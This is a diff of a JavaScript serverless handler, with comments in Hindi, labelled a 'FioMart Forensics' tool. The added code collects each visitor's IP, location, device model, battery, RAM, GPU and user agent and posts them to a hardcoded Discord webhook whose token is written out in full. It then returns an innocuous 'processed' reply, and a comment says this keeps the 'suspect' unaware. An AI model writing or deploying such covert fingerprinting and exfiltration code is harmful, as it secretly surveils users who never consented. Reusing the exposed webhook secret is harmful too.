@@ -19,10 +19,12 @@ export default async function handler(req, res) {
             // 2. ब्राउज़र (Client) से भेजा गया हार्डवेयर डेटा
             const hardwareData = req.body || {};
 
+            const timestamp = new Date().toISOString();
+
             // 3. पूरा फोरेंसिक लॉग कंबाइन करें
             const comprehensiveLog = {
                 CASE_STATUS: "SUSPECT_INTERACTION_DETECTED",
-                TIMESTAMP: new Date().toISOString(),
+                TIMESTAMP: timestamp,
                 NETWORK: {
                     ip_address: ip,
                     location: `${city}, ${country}`
@@ -37,16 +39,44 @@ export default async function handler(req, res) {
                     screen_resolution: hardwareData.screenRes || "N/A",
                     pixel_ratio: hardwareData.pixelRatio || "N/A",
                     timezone: hardwareData.timezone || "N/A",
-                    // 🔋 बैटरी की जानकारी यहाँ जोड़ दी गई है
                     battery_level: hardwareData.batteryLevel || "N/A",
                     is_charging: hardwareData.isCharging || "N/A"
                 }
             };
 
-            // 🔥 यह डेटा Vercel के लाइव डैशबोर्ड पर प्रिंट होगा
+            // 🔥 यह डेटा Vercel के लाइव डैशबोर्ड पर भी प्रिंट होगा
             console.log("==================== CRIMINAL INVESTIGATION DATA ====================");
             console.log(JSON.stringify(comprehensiveLog, null, 2));
             console.log("=====================================================================");
+
+            // 🎨 Discord Fancy Cyber Dashboard Payload Construction
+            const discordPayload = {
+                username: "🚨 CYBER DEFENSE FORCE",
+                avatar_url: "https://imgur.com", // डार्क थीम का अवतार
+                embeds: [{
+                    title: "💥 SUSPECT INTERACTION DETECTED",
+                    color: 15548997, // लाल रंग का अलर्ट बॉक्स
+                    timestamp: timestamp,
+                    footer: { text: "FioMart Forensics Center • Live Intelligence" },
+                    fields: [
+                        { name: "🌐 NETWORK POINT", value: `**IP Address:** \`${ip}\`\n**Location:** ${city}, ${country}`, inline: false },
+                        { name: "💻 DEVICE FINGERPRINT", value: `**Exact Model:** ${hardwareData.exactModel || "N/A"}\n**OS Version:** ${hardwareData.osVersion || "N/A"}\n**Timezone:** ${hardwareData.timezone || "N/A"}`, inline: true },
+                        { name: "🔋 POWER STATUS", value: `**Battery Level:** \`${hardwareData.batteryLevel || "N/A"}\`\n**Charging:** ${hardwareData.isCharging || "N/A"}`, inline: true },
+                        { name: "🛠️ HARDWARE DIAGNOSTICS", value: `**CPU Cores:** ${hardwareData.cores || "N/A"} Cores\n**RAM Memory:** ${hardwareData.ram || "N/A"} GB\n**Resolution:** ${hardwareData.screenRes || "N/A"}`, inline: false },
+                        { name: "🖥️ GPU RENDERER", value: `\`\`\`text\n${hardwareData.gpuRenderer || "N/A"}\n\`\`\``, inline: false },
+                        { name: "🌎 BROWSER USER AGENT", value: `\`\`\`text\n${userAgentString}\n\`\`\``, inline: false }
+                    ]
+                }]
+            };
+
+            // 📡 Discord सर्वर को लाइव अलर्ट भेजना
+            const discordWebhookUrl = "https://discord.com/api/webhooks/1547324422631727185/KUjrrOelPGcmiPzBVfcnVtm6RmWO9BEyUA3U6GuJ7lcHjZJipyT5xDMRgE7DvEO7cbfK"; 
+            
+            await fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordPayload)
+            });
 
             // संदिग्ध को सामान्य रिस्पॉन्स दें ताकि उसे कोई शक न हो
             return res.status(200).json({ status: "processed" });
